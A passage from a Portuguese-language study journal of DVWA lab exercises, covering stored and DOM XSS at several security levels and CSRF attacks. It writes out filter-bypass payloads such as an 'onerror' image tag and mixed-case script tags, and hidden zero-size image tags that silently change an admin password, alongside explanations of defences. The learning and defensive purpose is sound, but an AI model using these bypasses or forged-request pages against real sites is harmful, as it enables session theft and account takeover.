- **Output encoding** em vez de blacklist — tratar sempre o input como texto ao mostrá-lo, independentemente da forma que tiver (tag, atributo de evento, etc.). É o que o Impossible deve implementar.
- **Content Security Policy (CSP)** para restringir que scripts podem correr, como camada adicional.
- **HttpOnly** na cookie de sessão, para mitigar o roubo de sessão mesmo que um XSS passe.

### Domínios relacionados

- **Security+ — D2 / D4:** XSS persistente (Stored), falhas de blacklist, output encoding
- **CEH — D5 (Web Application Hacking):** bypass de filtros de input via atributos de evento HTML
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- Confusão inicial entre o popup do contador de caracteres (client-side, dispara sempre que se escreve o payload, independente do nível) e o resultado real do filtro do servidor (só visível após guardar e recarregar a página). Esclarecido durante o exercício.

### Próximos passos

- [ ] XSS Stored nível High
- [ ] XSS Stored nível Impossible
- [ ] XSS DOM

---

## Entrada #27 — XSS Stored (nível High)

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o XSS Stored contra a defesa de nível High e confirmar se segue o mesmo padrão já visto no Reflected High: blacklist mais esperta (apanha "script" independentemente de maiúsculas/minúsculas), mas ainda cega a outros vetores como `onerror`.

### Ação executada

1. DVWA Security → High. Módulo **XSS (Stored)** — base de dados com as entradas do teste anterior (Medium) ainda visíveis, servindo de referência.
2. **Injeção 1 — bypass do Medium**, no campo Message:
   ```
   <img src=x onerror=alert('XSS')>
   ```
   (Name: `teste`.) Submetido com "Sign Guestbook".
3. **Verificação:** ao recarregar a página, o popup "XSS" disparou.
4. **Injeção 2 — variação com maiúsculas/minúsculas**, no campo Message:
   ```
   <ScRiPt>alert('XSS')</ScRiPt>
   ```
   (Name: `teste`.) Submetido com "Sign Guestbook".

### Resultado

O bypass do Medium (`<img src=x onerror=alert('XSS')>`) **continuou a funcionar** no High — ficou guardado e disparou popup a cada recarregamento da página. Já o `<ScRiPt>alert('XSS')</ScRiPt>` foi **filtrado**: a entrada ficou registada como `Message: alert('XSS')`, texto solto sem execução — confirmando que a blacklist do High apanha a palavra "script" independentemente de maiúsculas/minúsculas, mas continua sem cobrir atributos de evento HTML como `onerror`. Mesmo padrão do XSS Reflected High.

### Deduções e raciocínio (certos e corrigidos)

- **Previsão certa:** previ que o comportamento seria igual ao Reflected High — confirmou-se nos dois testes (case-insensitive bloqueado, `onerror` a passar).
- **Consolidação:** já é o segundo módulo (Reflected e Stored) onde a mesma blacklist reforçada falha da mesma forma — reforça que o problema não é "faltou cobrir mais uma palavra", é a abordagem de blacklist em si, que nunca cobre todos os vetores possíveis.

**Consigo explicar isto a alguém?**
  Porque é que reforçar uma blacklist (case-insensitive) não resolve o problema de fundo: **Sim** — continua a vigiar palavras específicas, não o conceito de "código perigoso"; `onerror` nunca esteve na lista.

### Como nos podemos defender

- **Output encoding**, tratando qualquer input como texto na saída, independentemente da forma (tag, maiúsculas/minúsculas, atributo de evento). É o que se espera confirmar no Impossible.
- **Content Security Policy (CSP)** como camada adicional.
- **HttpOnly** na cookie de sessão.

### Domínios relacionados

- **Security+ — D2 / D4:** limitações de blacklists reforçadas; output encoding
- **CEH — D5 (Web Application Hacking):** bypass de filtros via atributos de evento HTML, independente da robustez da blacklist
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### Próximos passos

- [ ] XSS Stored nível Impossible
- [ ] XSS DOM

---

## Entrada #28 — XSS Stored (nível Impossible)

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o XSS Stored contra a defesa de nível Impossible e confirmar se, tal como no Reflected Impossible, a estratégia muda de blacklist para **output encoding** — fechando assim o módulo XSS Stored (Low → Impossible).

### Ação executada

1. DVWA Security → Impossible. Módulo **XSS (Stored)** — lista de entradas dos testes anteriores (Low, Medium, High) ainda visível.
2. **Injeção**, no campo Message, usando o bypass que tinha funcionado em todos os níveis anteriores:
   ```
   <img src=x onerror=alert('XSS')>
   ```
   (Name: `teste`.) Submetido com "Sign Guestbook".

### Resultado

Sem popup. A entrada apareceu na lista com o payload mostrado como **texto literal, escapado**: `&lt;img src=x onerror=alert('XSS')&gt;` — o `<` e o `>` convertidos em entidades HTML, pelo que o browser já não interpreta isto como uma tag, apenas como carateres visíveis. O `onerror` perde por completo o poder de execução.

**Observação adicional relevante:** a entrada mais antiga da lista (submetida no nível Low, na Entrada #25, que na altura aparecia com `Message:` vazia) passou a mostrar o texto completo e visível: `<script>alert('XSS')</script>`. Isto confirma que o output encoding **não altera o que está guardado na base de dados** — o texto em bruto do payload continua lá, inalterado desde o Low. A transformação acontece **no momento de gerar a página** (na saída), sempre que o servidor lê e mostra o conteúdo. Por isso a mesma entrada, perigosa quando vista sem proteção, torna-se inofensiva assim que é mostrada através do código do Impossible.

### Deduções e raciocínio (certos e corrigidos)

- **Previsão certa:** previ que "não passaria — tudo tratado como suspeito à partida", esperando output encoding como no Reflected Impossible. Confirmou-se.
- **Consolidação do padrão entre variantes:** ficou claro que Reflected e Stored partilham exatamente a mesma progressão de defesas nível a nível (mesma blacklist no Medium, mesmo reforço case-insensitive no High, mesmo output encoding no Impossible) — a variante (Reflected/Stored/DOM) determina *onde* o payload vive e *quem* atinge, não *como* se defende dele. O problema de fundo (input tratado como código) e a correção (tratá-lo sempre como texto na saída) são os mesmos.
- **Distinção conceptual nova (discutida antes do teste):** Low/Medium/High representam a **mesma categoria de falha**, com o "esforço necessário" do atacante a variar consoante o vigilante (blacklist) é mais ou menos esperto — um atacante mais experiente (que conhece vetores como `onerror`) passa onde um menos experiente ficaria bloqueado. O Impossible **não é "mais difícil"** — é uma mudança de categoria: deixa de haver lista para contornar, porque a transformação (encoding) se aplica sempre, independentemente da forma do ataque. Nas certificações, isto distingue "quão difícil é o ataque" (função do atacante) de "é estruturalmente possível, sim ou não" (função da arquitetura).

**Consigo explicar isto a alguém?**
  Que o output encoding acontece na saída (não altera os dados guardados) e por isso protege retroativamente até payloads antigos já guardados: **Sim**, com o exemplo concreto visto nesta entrada (a entrada do Low a aparecer subitamente como texto visível).
  A diferença entre "defesa mais difícil de contornar" (Low→High) e "problema estruturalmente resolvido" (Impossible): **Sim** — por palavras minhas, com a analogia do segurança/porta.

### Como nos podemos defender

- **Output encoding no momento de mostrar o conteúdo** — confirmado como a defesa correta e suficiente, independentemente de quando ou como o payload foi guardado.
- **Content Security Policy (CSP)** e **HttpOnly** continuam válidos como camadas adicionais de mitigação, mas o output encoding já resolve a causa raiz do XSS.

### Gravidade e impacto real (num cenário empresarial) — síntese para o módulo XSS Stored (Entradas #25-28)

Esta é a variante mais perigosa das três formas de XSS testadas, precisamente por não precisar de enganar ninguém individualmente — o payload fica guardado no servidor e dispara automaticamente para qualquer pessoa que visite a página, como um "verme" auto-propagante. Pode ser usado para recolher em massa as cookies de sessão de todos os visitantes, desfigurar conteúdo, ou redirecionar silenciosamente todos os utilizadores para malware. Numa pequena/média empresa, se a página vulnerável for algo aberto ao público (comentários, avaliações, um livro de visitas, um formulário de suporte), uma única injeção pode comprometer todos os clientes que visitem o site — e o dano de reputação é agravado por ser visivelmente "o site deles" a atacar os próprios visitantes, algo que pode ser fatal para a confiança numa marca pequena. Numa empresa grande, o mesmo mecanismo auto-propagante opera à escala de milhões de visitantes — historicamente, esta classe de falha já causou alguns dos maiores incidentes de "worms" em redes sociais e plataformas de grande dimensão.

### Domínios relacionados

- **Security+ — D2 / D4:** output encoding como controlo eficaz contra XSS persistente
- **CEH — D5 (Web Application Hacking):** diferença entre mitigação (blacklist reforçada) e correção estrutural (encoding na saída)
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### Próximos passos

- [ ] XSS DOM (Low → Impossible) — última variante do módulo XSS
- [ ] CSRF, File Upload, File Inclusion, Brute Force — para fechar a Fase 2

---

## Entrada #29 — XSS DOM (nível Low)

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Explorar a variante **DOM** do XSS no nível Low e confirmar na prática a diferença fundamental face ao Reflected e ao Stored: o payload é processado inteiramente pelo **JavaScript do browser**, sem o servidor alguma vez o examinar ou refletir na resposta HTML.

### Ação executada

1. Módulo **XSS (DOM)** — página com um seletor "Please choose a language" (dropdown) e botão "Select".
2. **Caso de controlo:** selecionado "English" e clicado "Select". O URL passou a `?default=English`; a página devolvida pelo servidor é sempre a mesma, independentemente do valor — quem lê `default` do URL e volta a escrevê-lo no dropdown é o JavaScript, já no browser.
3. **Injeção**, editando diretamente o URL:
   ```
   http://192.168.10.101/vulnerabilities/xss_d/?default=<script>alert('XSS')</script>
   ```

### Resultado

O popup "XSS" disparou. O dropdown ficou vazio (sem opção selecionada, porque o payload não é um valor de idioma válido), mas isso não impediu a execução — o script já tinha corrido antes disso. Confirmada a previsão: o Low, tal como em todos os módulos anteriores, não tem defesa nenhuma.

**Mecanismo técnico (source → sink):** o JavaScript da página lê o valor a seguir a `default=` diretamente do URL (**source** — o ponto onde entra o dado controlado pelo atacante) e usa-o para montar a lista de opções do dropdown, tipicamente via `document.write()` (**sink** — o ponto onde o dado é usado de forma que pode executar código), sem qualquer tratamento. Como a source chega ao sink sem ser escapada, o `<script>` é interpretado como HTML/JavaScript real. Nem a source nem o sink passam pelo servidor — ambos vivem inteiramente no browser.

### Deduções e raciocínio (certos e corrigidos)

- **Erro inicial corrigido:** a minha primeira previsão foi que o payload "não ia disparar" por estarmos em modo Low — inversão da lógica correta (Low = sem defesa = mais provável disparar). Ao ser questionado sobre o padrão dos módulos anteriores (Low sempre sem defesa), corrigi a previsão antes de testar, e o teste confirmou a correção.
- **Consolidação do conceito "source/sink":** entendido e por palavras próprias — a source é onde entra o dado do atacante (aqui, o URL), o sink é onde esse dado é usado de forma perigosa (aqui, a escrita no dropdown via JavaScript). O XSS acontece quando uma source chega a um sink sem tratamento pelo meio.
- **Confirmação da teoria do guia:** o guia já descrevia isto como "conceptual, por confirmar na prática" — agora confirmado: o payload viaja no URL (tal como no Reflected), mas quem o processa e executa é só o browser; o servidor devolve sempre a mesma página estática.

**Consigo explicar isto a alguém?**
  A diferença entre Reflected e DOM (ambos usam o URL, mas em Reflected o servidor reflete o valor na resposta, e em DOM é o JavaScript do browser que o lê e escreve, sem o servidor alguma vez o processar): **Sim** — por palavras próprias, com o conceito de source/sink.

### Como nos podemos defender

- **Tratar o problema no próprio JavaScript**, já que a defesa do lado do servidor (blacklist, encoding na resposta) não tem qualquer efeito aqui — o servidor nunca vê o payload processado.
- Usar APIs seguras como `textContent` em vez de `innerHTML`/`document.write()` ao escrever dados vindos do URL ou de outras fontes controláveis pelo utilizador.
- **Content Security Policy (CSP)** como camada adicional, mesmo não vendo o payload no servidor.

### Domínios relacionados

- **Security+ — D2 / D4:** XSS do lado do cliente; falhas específicas de JavaScript
- **CEH — D5 (Web Application Hacking):** DOM XSS como o mais difícil de detetar por ferramentas de análise de tráfego do servidor
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### Próximos passos

- [ ] XSS DOM nível Medium → Impossible
- [ ] Fechar módulo XSS por completo

---

## Entrada #30 — XSS DOM (nível Medium, resultado parcial)

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o XSS DOM contra a defesa de nível Medium. Ao contrário dos módulos anteriores, este exercício ficou com uma conclusão **parcial** — os factos foram confirmados, mas o mecanismo exato não foi possível de verificar até ao fim na sessão de hoje.

### Ação executada

1. DVWA Security → Medium. Módulo **XSS (DOM)**.
2. **Teste 1**, payload do Low no URL:
   ```
   http://192.168.10.101/vulnerabilities/xss_d/?default=<script>alert('XSS')</script>
   ```
   Resultado: o URL foi **reescrito automaticamente** para `?default=English` (redirecionamento do servidor). Sem popup.
3. **Teste 2**, bypass habitual:
   ```
   http://192.168.10.101/vulnerabilities/xss_d/?default=<img src=x onerror=alert('XSS')>
   ```
   Resultado: **sem redirecionamento** (o URL manteve-se), mas também **sem popup**.
4. **Investigação do código-fonte** ("View Page Source"): revelou que o JavaScript da página escreve o valor do parâmetro dentro de uma tag `<option>`:
   ```js
   document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
   ```
   Hipótese formada: como `<option>` só aceita texto (não elementos HTML aninhados), o `<img>` poderia estar a ser descartado pelo browser antes de se tornar um elemento real — o que explicaria o `onerror` nunca disparar. A tag `<script>`, por ser tratada de forma especial pelo interpretador HTML, teria continuado a funcionar no Low apesar da mesma limitação.
5. **Teste 3**, tentativa de "fugir" da tag `<option>` fechando-a primeiro:
   ```
   http://192.168.10.101/vulnerabilities/xss_d/?default=</option><img src=x onerror=alert('XSS')>
   ```
   Resultado: sem redirecionamento, mas **também sem popup** — a hipótese da tag `<option>` não foi confirmada por este teste.
6. **Tentativa de confirmação via DevTools:** tentei usar o Inspetor de Elementos e a Consola do Firefox para ver o DOM real após a execução do JavaScript (já que o "View Page Source" só mostra o HTML original, antes do JavaScript correr — distinção importante que ficou clara neste exercício). Não foi possível obter resposta da Consola nem localizar o elemento via o seletor visual, por dificuldades de utilização da ferramenta nesta sessão.

### Resultado

**Confirmado com confiança:**
- O nível Medium introduz um redirecionamento do servidor quando o parâmetro contém `<script` — provavelmente um filtro geral do DVWA aplicado a vários módulos, não específico deste código.
- Nem `<img src=x onerror=alert('XSS')>` nem `</option><img src=x onerror=alert('XSS')>` dispararam o popup neste nível.

**Não confirmado (limitação honesta desta sessão):**
- A razão exata pela qual o `<img onerror>` falha aqui — a hipótese da tag `<option>` só aceitar texto é razoável e baseada no código-fonte real, mas não foi verificada diretamente no DOM (via Inspetor/Consola), por dificuldades técnicas em usar essas ferramentas nesta sessão.

### Deduções e raciocínio (certos e corrigidos)

- **Distinção nova e importante:** "View Page Source" mostra sempre o HTML **original**, antes de qualquer JavaScript correr — nunca vai mostrar o resultado de um `document.write()`. Para ver o DOM real após o JavaScript, é preciso o Inspetor de Elementos ou a Consola. Esta distinção só ficou clara ao tentar (sem sucesso) confirmar a hipótese sobre a tag `<option>`.
- **Valor de documentar o que não se sabe:** em vez de forçar uma conclusão não confirmada, optei por registar a hipótese como hipótese, e a tentativa falhada de a confirmar como parte do processo — em linha com o espírito do projeto de documentar também o que não correu como planeado.

**Consigo explicar isto a alguém?**
  A diferença entre "View Source" e "Inspecionar/DOM real": **Sim**.
  O mecanismo exato de porque o `<img onerror>` falha no Medium: **Não, ainda não** — fica como pergunta em aberto para a próxima sessão.

### Domínios relacionados

- **Security+ — D2 / D4:** limitações de ferramentas de diagnóstico do lado do cliente
- **CEH — D5 (Web Application Hacking):** diferença entre HTML estático e DOM dinâmico na análise de uma aplicação

### O que correu mal / faltou

- Não foi possível confirmar via DevTools (Inspetor/Consola do Firefox) o estado real do DOM depois da injeção — a Consola não respondeu a comandos simples (`1+1`) nem o seletor visual de elementos saltou para o elemento certo. Causa não identificada nesta sessão (pode ser um problema de foco da janela, de exibição do painel, ou outro). A investigar na próxima sessão, possivelmente reiniciando o Firefox ou testando outra forma de abrir o DevTools.

### Próximos passos

- [ ] Resolver o acesso ao DevTools (Inspetor/Consola) do Firefox no Kali
- [ ] Confirmar o mecanismo exato da defesa do DOM Medium
- [ ] XSS DOM nível High → Impossible

---

## Entrada #31 — XSS DOM (nível High)

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o XSS DOM contra a defesa de nível High e comparar com o resultado (parcial) do Medium — Entrada #30.

### Ação executada

Repetidos, no nível High, os três testes já feitos no Medium:
1. `?default=<script>alert('XSS')</script>` — redirecionamento para `?default=English`.
2. `?default=<img src=x onerror=alert('XSS')>` — sem redirecionamento, sem popup.
3. `?default=<ScRiPt>alert('XSS')</ScRiPt>` — redirecionamento igual ao `<script>` simples.

### Resultado

**O High comportou-se exatamente como o Medium**, nos três testes. Isto contrasta com o padrão visto no Reflected e no Stored, onde o High trazia sempre uma melhoria clara sobre o Medium (filtro passa a apanhar variações de maiúsculas/minúsculas que o Medium não apanhava). Aqui, o filtro de redirecionamento já era case-insensitive desde o Medium, e ambos os níveis falham da mesma forma perante o `<img onerror>` — reforça a hipótese (ainda não confirmada, ver Entrada #30) de que a causa raiz está na estrutura do sink (`<option>`), não no filtro em si.

### Deduções e raciocínio (certos e corrigidos)

- **Padrão quebrado, e é um resultado válido:** ao contrário de todos os módulos anteriores, aqui Medium e High não diferem. Documentar "não há diferença" é tão importante como documentar uma diferença — evita a suposição de que todos os módulos seguem sempre a mesma progressão em degraus.

**Consigo explicar isto a alguém?**
  Que Medium e High podem, nalguns casos, ter a mesma defesa (não há uma regra universal de que High é sempre "mais um passo" acima do Medium): **Sim**.

### Domínios relacionados

- **Security+ — D2 / D4:** variações reais entre implementações de "níveis" de segurança
- **CEH — D5 (Web Application Hacking):** importância de testar cada nível individualmente, sem assumir progressão

### Próximos passos

- [ ] XSS DOM nível Impossible
- [ ] Fechar módulo XSS DOM e módulo XSS por completo

---

## Entrada #32 — XSS DOM (nível Impossible) — fecha o módulo XSS por completo

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o XSS DOM contra a defesa de nível Impossible, fechando o módulo XSS DOM (Low → Impossible) e, com ele, o módulo XSS por completo (Reflected + Stored + DOM).

### Ação executada

Testado no URL:
```
http://192.168.10.101/vulnerabilities/xss_d/?default=<script>alert('XSS')</script>
```

### Resultado

Sem popup. O dropdown mostrou a opção com o valor **codificado em URL, tal como enviado**: `%3Cscript%3Ealert(%27XSS%27)%3C/script%3E` — ou seja, o valor nunca foi decodificado de volta para `<script>...`, ficando como texto opaco e inofensivo. Diferente da forma de output encoding vista no Reflected/Stored Impossible (que convertia `<` em `&lt;`, mostrando o payload de forma legível como texto), aqui a defesa é **não decodificar** o valor original — outra via para o mesmo objetivo: nunca deixar o valor do atacante ser interpretado como HTML/JavaScript.

### Deduções e raciocínio (certos e corrigidos)

- **Confirmação do padrão geral:** tal como nos outros dois módulos XSS, o Impossible resolve o problema de raiz, não com mais uma regra na blacklist. Aqui a via foi diferente na forma (não decodificar, em vez de escapar caracteres), mas o princípio é o mesmo: nunca permitir que o valor do atacante seja tratado como código.
- **Nova nuance aprendida:** existem várias implementações válidas de "tratar o input como texto" — escapar caracteres (`&lt;`) é uma forma; não decodificar a codificação de URL é outra. O objetivo (nunca interpretar como código) é mais importante do que o mecanismo exato usado para o alcançar.

**Consigo explicar isto a alguém?**
  Que o Impossible do DOM resolve o problema de forma diferente do Reflected/Stored (não decodificar, em vez de escapar), mas com o mesmo princípio de fundo: **Sim**.

### Como nos podemos defender

- **Nunca decodificar/interpretar dados vindos do URL (ou de outra source) antes de os mostrar** — tratá-los sempre como texto opaco.
- Usar APIs seguras como `textContent` em vez de `innerHTML`/`document.write()`.
- **Content Security Policy (CSP)** como camada adicional.

### Gravidade e impacto real (num cenário empresarial) — síntese para o módulo XSS DOM (Entradas #29-32)

Por o processamento acontecer inteiramente no browser (a origem e o destino do dado malicioso nunca tocam o servidor), este tipo de XSS é frequentemente invisível a firewalls de aplicação web e a sistemas de registo do lado do servidor — um vetor genuinamente mais difícil de detetar do que os anteriores, mesmo tendo consequências semelhantes (roubo de sessão, phishing). Numa pequena/média empresa, tipicamente sem qualquer monitorização do lado do cliente, este tipo de ataque pode passar despercebido indefinidamente. Numa empresa grande, mesmo com defesas robustas do lado do servidor (WAF, SIEM), o XSS DOM pode escapar-lhes por completo a não ser que exista monitorização específica do lado do cliente (políticas de segurança de conteúdo com relatório, ferramentas de monitorização real de utilizadores) — um ponto cego que depende mais de maturidade de processo do que de dimensão da empresa.

### Domínios relacionados

- **Security+ — D2 / D4:** múltiplas implementações válidas de output encoding/escaping
- **CEH — D5 (Web Application Hacking):** DOM XSS resolvido através de tratamento seguro de dados do lado do cliente
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### Balanço do módulo XSS (Reflected + Stored + DOM, Low → Impossible)

Módulo XSS fechado por completo nesta sessão (2026-08-15), com as três variantes exploradas do Low ao Impossible: Reflected (Entradas #21–#24), Stored (Entradas #25–#28) e DOM (Entradas #29–#32, com a Entrada #30 documentando uma limitação honesta — o mecanismo exato do Medium/High do DOM não foi confirmado ao detalhe, por dificuldades com o DevTools do Firefox). Consolidação completa em [`guias-estudo/guia-estudo-xss.md`](./guias-estudo/guia-estudo-xss.md).

### Próximos passos

- [ ] Resolver o acesso ao DevTools do Firefox no Kali (pendente da Entrada #30)
- [ ] CSRF, File Upload, File Inclusion, Brute Force — para fechar oficialmente a Fase 2

---

## Entrada #33 — CSRF (nível Low)

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (também "vítima" nesta simulação), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Primeira exploração do módulo **CSRF** (Cross-Site Request Forgery) do DVWA — perceber e demonstrar na prática um ataque que, ao contrário do SQLi/Command Injection/XSS, não injeta código nenhum: aproveita a sessão já autenticada da vítima para forjar um pedido em nome dela.

### Ação executada

1. DVWA Security → Low. Módulo **CSRF** — formulário "Change your admin password" (Current password, New password, Confirm new password).
2. **Caso de controlo:** mudança de password feita normalmente pelo formulário, confirmando "Password Changed." e observando que o pedido usa **método GET**, com os valores visíveis no URL (`?password_current=...&password_new=...`) — sem token nem verificação extra.
3. **Construção do ataque:** ficheiro HTML criado no Kali (`~/csrf_attack.html`), com uma tag `<img>` cujo `src` aponta para o URL de mudança de password do DVWA, com uma password nova escolhida (`csrfhack2026`):
   ```html
   <img src="http://192.168.10.101/vulnerabilities/csrf/?password_current=x&password_new=csrfhack2026&password_conf=csrfhack2026&Change=Change" width="0" height="0" border="0">
   ```
4. **Execução:** ficheiro aberto localmente no Firefox (`file:///home/pedro/csrf_attack.html`), com a sessão do DVWA ainda ativa no mesmo browser — sem passar pelo formulário oficial em nenhum momento.
5. **Verificação:** logout do DVWA e novo login com a password `csrfhack2026`.

### Resultado

Login bem-sucedido com `csrfhack2026` — password que **nunca foi escrita em nenhum formulário do DVWA**, só existia no ficheiro HTML local. Confirma que o simples ato de abrir a página maliciosa (com a sessão do DVWA ativa) foi suficiente para mudar a password, através do pedido automático desencadeado pela tag `<img>`.

### Deduções e raciocínio (certos e corrigidos)

- **Dificuldade inicial reconhecida:** tive dificuldade em perceber o mecanismo sem uma analogia concreta — as primeiras explicações, mais técnicas e rápidas, não foram suficientes. Só ficou claro com a analogia do "cartão de identificação automático" (a cookie de sessão) e da "sala escondida com um mecanismo que empurra para a porta do banco" (a página maliciosa com o `<img>`).
- **Consolidação do conceito central:** o browser envia a cookie de sessão automaticamente em qualquer pedido a um site, independentemente de qual página ou elemento desencadeou esse pedido — o servidor não tem forma de saber se foi uma ação consciente do utilizador ou um pedido forjado escondido numa página qualquer.
- **Falha adicional do nível Low identificada:** o servidor nem verifica a `password_current` — só usa `password_new`. Isto tornou o ataque ainda mais fácil neste nível específico; nos níveis seguintes isso pode não ser assim.
- **Diferença face ao XSS, agora clara:** no XSS há injeção de código que corre no browser da vítima dentro do site vulnerável; no CSRF não há injeção nenhuma — só se aproveita a sessão já existente da vítima para forjar um pedido a partir de **outro** sítio (mesmo que seja um ficheiro local, como aqui).

**Consigo explicar isto a alguém?**
  O mecanismo geral do CSRF e o papel da tag `<img>`: **Sim**, com a analogia do cartão de identificação/porta do banco.

### Como nos podemos defender

- **CSRF tokens:** um valor secreto e único, gerado pelo servidor e incluído em cada formulário legítimo, que o atacante não consegue adivinhar nem incluir no seu pedido forjado. É a defesa principal.
- **Verificar sempre a `password_current` (ou equivalente)** antes de aceitar uma mudança sensível — reduz o impacto mesmo sem eliminar a causa raiz.
- **SameSite (cookie):** atributo que pode impedir o browser de enviar a cookie de sessão em pedidos vindos de outros sítios.
- Preferir métodos **POST** para ações que alteram dados, aliado a verificação de origem do pedido (não resolve sozinho, mas dificulta ataques simples via `<img>` em GET).

### Domínios relacionados

- **Security+ — D2 / D4:** CSRF como categoria distinta de vulnerabilidade web; tokens anti-CSRF
- **CEH — D5 (Web Application Hacking):** CSRF, diferença face a XSS, exploração sem injeção de código
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### Próximos passos

- [ ] CSRF nível Medium → Impossible

---

## Entrada #34 — CSRF (nível Medium)

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (também "vítima"), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o CSRF contra a defesa de nível Medium, repetindo o mesmo ataque do Low (ficheiro HTML com `<img>`).

### Ação executada

1. **Nota de percurso:** houve confusão inicial — o primeiro teste deu erro "CSRF token is incorrect", que fez suspeitar de token anti-CSRF no Medium. Verificação em "DVWA Security" revelou que o nível estava, na verdade, em **Impossible** (não tinha sido mudado corretamente). Corrigido para Medium.
2. Formulário do CSRF no Medium tem **apenas** "New password" e "Confirm new password" — sem campo "Current password" (diferente do Low). Password de base estabelecida via formulário normal (`password`).
3. Ficheiro `csrf_attack2.html` criado no Kali, com `<img>` a apontar para o URL de mudança de password (`csrfmedium2026`), sem `password_current` no pedido (já que o Medium não tem esse campo):
   ```html
   <img src="http://192.168.10.101/vulnerabilities/csrf/?password_new=csrfmedium2026&password_conf=csrfmedium2026&Change=Change" width="0" height="0" border="0">
   ```
4. Ficheiro aberto localmente no Firefox, com sessão do DVWA ativa. Logout e novo login com `csrfmedium2026`.

### Resultado

Login bem-sucedido com `csrfmedium2026` — **o ataque funcionou no Medium tal como no Low**. Observação relevante: o ficheiro foi aberto via `file://` (protocolo local), que tipicamente não envia cabeçalho "Referer" (ou envia vazio) num pedido subsequente. Se o Medium tivesse uma verificação de Referer, seria expectável que este ataque falhasse nessas condições. Como funcionou, é um indício (não confirmado ao detalhe, sem ver o código-fonte) de que o Medium **não impõe uma defesa eficaz** contra este vetor.

### Deduções e raciocínio (certos e corrigidos)

- **Erro corrigido a meio do processo:** confundi inicialmente Impossible com Medium, por não ter confirmado o nível ativo antes de testar — lição já aprendida noutros módulos (confirmar sempre o nível do DVWA Security antes de testar), mas que valeu a pena reforçar aqui.
- **Confirmação do padrão Low/Medium/High:** tal como discutido antes do teste, Medium continua na mesma categoria de falha que o Low — não resolve a causa raiz, mesmo que a interface do formulário seja ligeiramente diferente (sem campo de password atual).

**Consigo explicar isto a alguém?**
  Que o CSRF continua a funcionar no Medium, e uma hipótese razoável de porquê (falta de verificação eficaz de Referer): **Sim**, com a ressalva de que não foi confirmado ao detalhe.

### Domínios relacionados

- **Security+ — D2 / D4:** limitações de defesas baseadas em Referer
- **CEH — D5 (Web Application Hacking):** importância de confirmar o nível de segurança ativo antes de qualquer teste

### Próximos passos

- [ ] CSRF nível High → Impossible

---

## Entrada #35 — CSRF (nível High)

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (também "vítima"), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o CSRF contra a defesa de nível High, repetindo o mesmo ataque via ficheiro HTML.

### Ação executada

1. DVWA Security → High (confirmado antes de testar, evitando o erro do Medium). Formulário igual ao Medium (sem "Current password").
2. Ficheiro `csrf_attack3.html` criado no Kali, com `<img>` a apontar para o URL de mudança de password (`csrfhigh2026`).
3. Ficheiro aberto localmente no Firefox (`file://`), com sessão do DVWA ativa. Logout e novo login com `csrfhigh2026`.

### Resultado

Login bem-sucedido com `csrfhigh2026` — **o ataque funcionou também no High**. O nível High do DVWA costuma introduzir verificação do cabeçalho **Referer** (confirma se o pedido veio de dentro do próprio site, comparando o Referer com o nome do servidor). Como o ficheiro foi aberto via `file://`, não existe Referer nenhum no pedido — e essa ausência não foi tratada como "pedido suspeito, recusar", mas sim deixada passar. Uma verificação pensada para o caso "Referer errado" não cobriu o caso "Referer inexistente".

### Deduções e raciocínio (certos e corrigidos)

- **Lição nova e importante:** uma defesa pode ter lógica correta para o caso esperado (Referer de outro site) e ainda assim falhar num caso-limite não previsto (Referer ausente). Isto generaliza para além do CSRF — é um padrão comum em falhas de segurança reais: a lógica cobre o "caminho feliz" mas não os casos extremos.
- **Padrão confirmado, terceira vez:** Low, Medium e High continuam todos na mesma categoria — nenhum resolve a causa raiz do CSRF.

**Consigo explicar isto a alguém?**
  Porque é que a verificação de Referer do High falhou neste caso (ausência de Referer, não Referer errado): **Sim**.

### Domínios relacionados

- **Security+ — D2 / D4:** falhas de lógica em casos-limite; verificações de Referer como defesa incompleta
- **CEH — D5 (Web Application Hacking):** técnica real e conhecida de bypass de CSRF via ausência de Referer (ex.: página local, ou certas configurações de proxy/extensões que removem o cabeçalho)

### Próximos passos

